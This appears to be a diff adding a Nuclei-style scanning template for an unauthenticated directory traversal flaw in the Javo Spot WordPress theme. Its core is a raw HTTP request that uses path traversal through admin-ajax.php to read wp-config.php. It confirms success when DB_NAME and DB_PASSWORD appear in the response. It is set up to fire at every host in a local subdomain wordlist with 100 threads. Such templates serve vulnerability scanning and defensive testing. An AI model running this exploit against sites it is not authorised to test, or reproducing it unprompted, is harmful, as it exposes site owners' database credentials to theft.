@@ -1,0 +1,34 @@
+id: wp-javospot-lfi
+info:
+  name: Javo Spot Premium Theme - Unauthenticated Directory Traversal
+  author: 0x_Akoko
+  severity: high
+  description: A vulnerability in Javo Spot Premium Theme allows remote unauthenticated attackers access to locally stored file and return their content.
+  reference:
+    - https://codeseekah.com/2017/02/09/javo-themes-spot-lfi-vulnerability/
+    - https://wpscan.com/vulnerability/2d465fc4-d4fa-43bb-9c0d-71dcc3ee4eab
+    - https://themeforest.net/item/javo-spot-multi-purpose-directory-wordpress-theme/13198068
+  tags: wordpress,wp-theme,lfi,wp
+requests:
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
+    raw:
+      - |
+        GET /wp-admin/admin-ajax.php?jvfrm_spot_get_json&fn=../../wp-config.php&callback=jQuery HTTP/1.1
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "DB_NAME"
+          - "DB_PASSWORD"
+        condition: and
+      - type: status
+        status:
+          - 200
